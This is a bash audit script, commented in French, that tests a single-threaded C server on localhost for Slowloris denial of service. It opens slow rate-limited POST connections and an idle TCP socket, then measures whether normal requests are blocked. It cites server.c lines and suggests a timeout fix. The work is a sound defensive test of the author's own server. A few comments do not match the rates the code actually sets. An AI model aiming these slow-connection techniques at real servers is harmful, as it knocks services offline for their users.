#!/bin/bash
# ============================================================
# GREY BOX AUDIT - 05 - SLOWLORIS ANALYSE PRÉCISE
# SOURCE CODE KNOWLEDGE:
# server.c L.157    : while(true) → serveur SINGLE THREAD
# server.c L.195    : SO_RCVTIMEO = 5 secondes
# server.c L.213-275: do { recv() } while(strstr(..."\r\n\r\n") == NULL)
#
# POURQUOI SO_RCVTIMEO=5s NE PROTÈGE PAS :
# SO_RCVTIMEO expire si AUCUN octet pendant 5s.
# Slowloris envoie 1 octet chaque ~4s → chaque recv() retourne
# 1 octet en <5s → timeout JAMAIS déclenché.
#
# PREUVE : avec rate = 1 byte/sec:
#   - recv() bloquant attend
#   - 1 byte arrive → recv() retourne après 1s (< 5s timeout)
#   - loop: strstr() ne trouve pas \r\n\r\n encore
#   - recv() reblocke → cycle infini
# ============================================================

BASE_URL="http://127.0.0.1:8080"
HOST="127.0.0.1"
PORT="8080"
RESULTS_FILE="/tmp/gb_05_slowloris_results.txt"
PASS=0; FAIL=0; VULN=0

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'

log_pass() { echo -e "${GREEN}[PASS]${NC} $1" | tee -a "$RESULTS_FILE"; PASS=$((PASS+1)); }
log_fail() { echo -e "${RED}[FAIL]${NC} $1" | tee -a "$RESULTS_FILE"; FAIL=$((FAIL+1)); }
log_vuln() { echo -e "${RED}[VULN]${NC} $1" | tee -a "$RESULTS_FILE"; VULN=$((VULN+1)); }
log_info() { echo -e "${BLUE}[INFO]${NC} $1" | tee -a "$RESULTS_FILE"; }
log_code() { echo -e "${CYAN}[CODE]${NC} $1" | tee -a "$RESULTS_FILE"; }

check_alive() {
    local desc="$1"
    local RESP
    RESP=$(curl -s -o /dev/null -w "%{http_code}" --max-time 3 \
        -X POST "$BASE_URL/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"check","password":"test"}' 2>/dev/null)
    if [ "$RESP" = "000" ]; then
        log_vuln "[DEAD] $desc: Serveur ne répond plus!"
        return 1
    else
        log_pass "[ALIVE] $desc → HTTP $RESP"
        return 0
    fi
}

echo "" | tee "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
echo "  GREY BOX - 05 - SLOWLORIS PRÉCIS" | tee -a "$RESULTS_FILE"
echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')" | tee -a "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
echo "" | tee -a "$RESULTS_FILE"

log_code "server.c:157 : while(true) → SINGLE THREAD (une connexion à la fois)"
log_code "server.c:195 : SO_RCVTIMEO = {5, 0} → timeout par appel recv()"
log_code "server.c:213 : do { recv() } while(strstr(buf, '\\r\\n\\r\\n') == NULL)"
log_code ""
log_code "ANALYSE:"
log_code "  SO_RCVTIMEO=5s expire si 0 octet pendant 5s"
log_code "  Slowloris: 1 byte chaque 4s → recv() retourne en 4s (< 5s) → PAS de timeout"
log_code "  Résultat: boucle bloquée indéfiniment jusqu'à complétion des headers"
echo "" | tee -a "$RESULTS_FILE"

# ============================================================
# 1. PREUVE QUE 5s TIMEOUT NE PROTÈGE PAS (rate = 2s/byte)
# ============================================================
echo "--- [1] Connexion à 2 bytes/sec (< timeout 5s) ---" | tee -a "$RESULTS_FILE"
log_code "2 bytes/sec : chaque recv() retourne en ~2s (< SO_RCVTIMEO=5s) → BLOQUE"

PARTIAL_REQ="POST /login HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 40\r\n\r\n{\"username\":\"slow\",\"password\":\"slow\"}"

check_alive "avant test 2B/sec"

# Slowloris à 2 bytes/sec en background
curl -s -o /dev/null \
    --limit-rate 2 \
    --max-time 20 \
    -X POST "$BASE_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"slowloris_2bps_test","password":"SlowTest1234!"}' &
SLOW_PID=$!

sleep 2
log_info "Connexion lente démarrée (PID: $SLOW_PID), test disponibilité..."
check_alive "pendant slowloris 2B/sec"

sleep 2
check_alive "pendant slowloris 2B/sec (2e check)"

kill $SLOW_PID 2>/dev/null
wait $SLOW_PID 2>/dev/null
sleep 1

# ============================================================
# 2. PREUVE QUE 4s TIMEOUT NE PROTÈGE PAS (rate = 1.5s/byte)
# ============================================================
echo "" | tee -a "$RESULTS_FILE"
echo "--- [2] Connexion à 1.5 bytes/sec (taux minimal pour éviter timeout 5s) ---" | tee -a "$RESULTS_FILE"
log_code "1 byte chaque 4 secondes : encore < 5s timeout → serveur bloqué"

check_alive "avant test 1.5B/sec"

curl -s -o /dev/null \
    --limit-rate 1 \
    --max-time 30 \
    -X POST "$BASE_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"slowloris_1bps_test","password":"SlowTest1234!"}' &
SLOW_PID2=$!

sleep 3
log_info "Test disponibilité pendant slowloris 1B/sec..."
check_alive "pendant slowloris 1B/sec"

kill $SLOW_PID2 2>/dev/null
wait $SLOW_PID2 2>/dev/null
sleep 1

# ============================================================
# 3. TEST : COMBIEN DE CONNEXIONS SIMULTANÉES BLOQUENT?
# ============================================================
echo "" | tee -a "$RESULTS_FILE"
echo "--- [3] Seuil de blocage (combien de connexions simultanées?) ---" | tee -a "$RESULTS_FILE"
log_code "backlog=10 (server.c:35) → max 10+1 connexions en attente"
log_code "Serveur single-thread: UNE seule connexion traitée → les autres en backlog"
log_code "Avec N=2 slow connections: serveur traite la 1ère lentement → 2ème attend"

check_alive "avant test N connexions"

# Ouvrir 2 connexions lentes simultanées
for i in 1 2; do
    curl -s -o /dev/null \
        --limit-rate 1 \
        --max-time 30 \
        -X POST "$BASE_URL/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"slowN_test","password":"SlowTest1234!"}' &
done

sleep 2
log_info "2 connexions lentes ouvertes, test disponibilité..."
check_alive "2 connexions lentes"

# Vérifier si une 3ème requête normale passe
RESP=$(curl -s -o /tmp/gb_body.txt -w "%{http_code}" --max-time 6 \
    -X POST "$BASE_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"normalcheck","password":"test"}' 2>/dev/null)
echo "  3ème requête normale → HTTP $RESP | $(cat /tmp/gb_body.txt)" | tee -a "$RESULTS_FILE"
if [ "$RESP" = "000" ]; then
    log_vuln "[SLOWLORIS-N] 2 connexions lentes bloquent les requêtes normales!"
fi

kill $(jobs -p) 2>/dev/null
wait 2>/dev/null
sleep 1

# ============================================================
# 4. CALCUL DU TEMPS D'ATTENTE MAXIMUM FORCÉ (read timeout)
# ============================================================
echo "" | tee -a "$RESULTS_FILE"
echo "--- [4] Calcul exact du temps de blocage forcé ---" | tee -a "$RESULTS_FILE"
log_code "server.c:195 : SO_RCVTIMEO = 5s"
log_code "Si le client arrête complètement d'envoyer, recv() retourne après 5s"
log_code "Preuve: connexion TCP ouverte mais AUCUN byte envoyé → timeout en 5s"

T_START=$(date +%s%N)
# Ouvre une connexion TCP mais n'envoie rien (juste le SYN)
python3 -c "
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 8080))
# Connection ouverte, on n'envoie rien
time.sleep(7)  # attend 7s
s.close()
" &
DEAD_PID=$!

sleep 1
T_BLOCK_START=$(date +%s%N)
# Essayer d'envoyer une requête normale - doit attendre que la première soit traitée
RESP=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
    -X POST "$BASE_URL/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"timeouttest","password":"test"}' 2>/dev/null)
T_BLOCK_END=$(date +%s%N)
BLOCK_TIME=$(( (T_BLOCK_END - T_BLOCK_START) / 1000000 ))

echo "  Connexion silencieuse → requête suivante bloquée ${BLOCK_TIME}ms | HTTP $RESP" | tee -a "$RESULTS_FILE"
if [ "$BLOCK_TIME" -ge 4500 ]; then
    log_vuln "[DEADCONN] Connexion TCP vide bloque le serveur ${BLOCK_TIME}ms (≈SO_RCVTIMEO=5s)"
    log_code "  Fix: réduire SO_RCVTIMEO à 2s ET vérifier débit minimum (ex: fermer si <100B/s)"
else
    log_pass "[DEADCONN] Blocage ${BLOCK_TIME}ms (rapide)"
fi

kill $DEAD_PID 2>/dev/null
wait $DEAD_PID 2>/dev/null

echo "" | tee -a "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
echo "  RÉSULTATS SLOWLORIS: $PASS PASS | $FAIL FAIL | $VULN VULN" | tee -a "$RESULTS_FILE"
echo "  Résultats: $RESULTS_FILE" | tee -a "$RESULTS_FILE"
echo "========================================================" | tee -a "$RESULTS_FILE"
